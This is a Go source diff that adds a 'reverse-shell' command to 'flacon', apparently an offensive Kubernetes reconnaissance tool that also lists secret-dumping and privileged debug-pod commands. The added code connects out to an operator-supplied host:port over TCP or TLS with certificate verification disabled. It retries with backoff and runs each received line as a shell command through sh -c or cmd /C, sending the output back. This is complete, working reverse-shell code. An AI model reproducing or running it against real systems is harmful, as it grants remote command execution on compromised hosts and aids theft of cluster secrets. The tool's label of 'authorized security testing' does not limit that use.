@@ -1,10 +1,13 @@
 package main
 
 import (
+	"bufio"
 	"context"
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"net"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -60,6 +63,15 @@ func main() {
 		case "debug-pod", "--debug-pod":
 			// Create a privileged debug pod
 			createDebugPod()
+			return
+		case "reverse-shell", "--reverse-shell":
+			// Establish reverse shell connection
+			if len(os.Args) < 3 {
+				fmt.Println("❌ Usage: flacon reverse-shell <host:port>")
+				fmt.Println("   Example: flacon reverse-shell 192.168.1.100:4444")
+				return
+			}
+			establishReverseShell(os.Args[2])
 			return
 		}
 	}
@@ -187,6 +199,7 @@ Commands:
   quick, --quick           Run quick reconnaissance (skip filesystem scan)
   dump-secrets, --dump-secrets  Dump secrets from all accessible namespaces
   debug-pod, --debug-pod   Create a privileged debug pod
+  reverse-shell, --reverse-shell <host:port>  Establish reverse shell connection
   (no args)                Run full Kubernetes reconnaissance
 
 Examples:
@@ -194,14 +207,15 @@ Examples:
   flacon quick             Run quick reconnaissance (faster)
   flacon dump-secrets      Dump all secrets from all namespaces
   flacon debug-pod         Create a privileged debug pod
+  flacon reverse-shell 192.168.1.100:4444  Connect to reverse shell listener
   flacon version           Show version information
   flacon --help            Show help message
 
 Note: Full reconnaissance includes filesystem scanning which can be slow on large systems.
 Use 'quick' mode for faster results without filesystem scanning.
 
-WARNING: dump-secrets and debug-pod commands require appropriate Kubernetes permissions
-and should only be used for authorized security testing.
+WARNING: dump-secrets, debug-pod, and reverse-shell commands require appropriate 
+permissions and should only be used for authorized security testing.
 
 `, version.String())
 }
@@ -686,4 +700,160 @@ func createDebugPod() {
 	}
 
 	fmt.Println("⚠️  Pod creation timed out, but pod may still be starting")
+}
+
+func establishReverseShell(target string) {
+	fmt.Println("🔌 Establishing reverse shell connection...")
+	fmt.Println("📋 Version:", version.String())
+	fmt.Printf("🎯 Target: %s\n", target)
+
+	// Parse target
+	host, port, err := net.SplitHostPort(target)
+	if err != nil {
+		fmt.Printf("❌ Invalid target format: %v\n", err)
+		fmt.Println("   Use format: host:port (e.g., 192.168.1.100:4444)")
+		return
+	}
+
+	fmt.Printf("📍 Connecting to %s:%s\n", host, port)
+
+	// Try to establish connection with retry logic
+	maxRetries := 5
+	retryDelay := 2 * time.Second
+
+	for attempt := 1; attempt <= maxRetries; attempt++ {
+		fmt.Printf("🔄 Attempt %d/%d: Connecting...\n", attempt, maxRetries)
+
+		// Try TCP connection first
+		conn, err := net.DialTimeout("tcp", target, 10*time.Second)
+		if err != nil {
+			fmt.Printf("   ❌ TCP connection failed: %v\n", err)
+
+			// Try TLS connection as fallback
+			tlsConfig := &tls.Config{
+				InsecureSkipVerify: true, // Skip certificate verification for pentesting
+			}
+			conn, err = tls.DialWithDialer(&net.Dialer{Timeout: 10 * time.Second}, "tcp", target, tlsConfig)
+			if err != nil {
+				fmt.Printf("   ❌ TLS connection also failed: %v\n", err)
+
+				if attempt < maxRetries {
+					fmt.Printf("   ⏳ Retrying in %v...\n", retryDelay)
+					time.Sleep(retryDelay)
+					retryDelay *= 2 // Exponential backoff
+					continue
+				} else {
+					fmt.Println("❌ All connection attempts failed")
+					return
+				}
+			} else {
+				fmt.Println("   ✅ TLS connection established")
+			}
+		} else {
+			fmt.Println("   ✅ TCP connection established")
+		}
+
+		defer conn.Close()
+
+		// Send initial handshake
+		handshake := fmt.Sprintf("flacon-reverse-shell-v1.3.0|%s|%s|%s\n",
+			runtime.GOOS, runtime.GOARCH, version.String())
+		_, err = conn.Write([]byte(handshake))
+		if err != nil {
+			fmt.Printf("❌ Failed to send handshake: %v\n", err)
+			return
+		}
+
+		fmt.Println("✅ Reverse shell connection established!")
+		fmt.Println("🔧 Starting interactive shell...")
+
+		// Start bidirectional communication
+		go handleIncomingCommands(conn)
+		handleOutgoingResponses(conn)
+
+		// If we reach here, connection was lost
+		fmt.Println("⚠️  Connection lost, attempting to reconnect...")
+		if attempt < maxRetries {
+			time.Sleep(retryDelay)
+			continue
+		}
+	}
+
+	fmt.Println("❌ Failed to establish stable connection after all attempts")
+}
+
+func handleIncomingCommands(conn net.Conn) {
+	scanner := bufio.NewScanner(conn)
+	for scanner.Scan() {
+		command := strings.TrimSpace(scanner.Text())
+		if command == "" {
+			continue
+		}
+
+		// Handle special commands
+		switch command {
+		case "exit", "quit":
+			fmt.Println("🛑 Received exit command")
+			conn.Close()
+			os.Exit(0)
+		case "ping":
+			response := "pong\n"
+			conn.Write([]byte(response))
+			continue
+		case "info":
+			info := fmt.Sprintf("OS: %s, Arch: %s, Version: %s\n",
+				runtime.GOOS, runtime.GOARCH, version.String())
+			conn.Write([]byte(info))
+			continue
+		}
+
+		// Execute system command
+		go executeCommand(conn, command)
+	}
+
+	if err := scanner.Err(); err != nil {
+		fmt.Printf("❌ Error reading from connection: %v\n", err)
+	}
+}
+
+func handleOutgoingResponses(conn net.Conn) {
+	// This function can be used to send periodic status updates
+	// or handle other outgoing communication
+	ticker := time.NewTicker(30 * time.Second)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-ticker.C:
+			status := fmt.Sprintf("heartbeat|%s|%s\n",
+				time.Now().Format(time.RFC3339), version.String())
+			conn.Write([]byte(status))
+		}
+	}
+}
+
+func executeCommand(conn net.Conn, command string) {
+	var cmd *exec.Cmd
+
+	// Determine shell based on OS
+	switch runtime.GOOS {
+	case "windows":
+		cmd = exec.Command("cmd", "/C", command)
+	default:
+		cmd = exec.Command("sh", "-c", command)
+	}
+
+	// Capture output
+	output, err := cmd.CombinedOutput()
+
+	// Prepare response
+	var response string
+	if err != nil {
+		response = fmt.Sprintf("ERROR: %v\nOUTPUT:\n%s\n", err, string(output))
+	} else {
+		response = fmt.Sprintf("SUCCESS\nOUTPUT:\n%s\n", string(output))
+	}
+
+	// Send response back
+	conn.Write([]byte(response))
 }
